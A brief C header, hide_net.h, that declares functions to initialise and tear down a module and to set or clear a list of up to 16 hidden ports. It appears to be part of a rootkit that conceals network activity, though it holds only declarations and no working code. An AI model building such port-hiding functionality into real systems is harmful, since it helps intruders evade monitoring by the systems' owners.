#ifndef HIDE_NET_H
#define HIDE_NET_H

#define MAX_HIDDEN_PORTS 16

int  hide_net_init(void);
void hide_net_exit(void);

void set_hidden_port(unsigned int port);
void clear_hidden_ports(void);

#endif
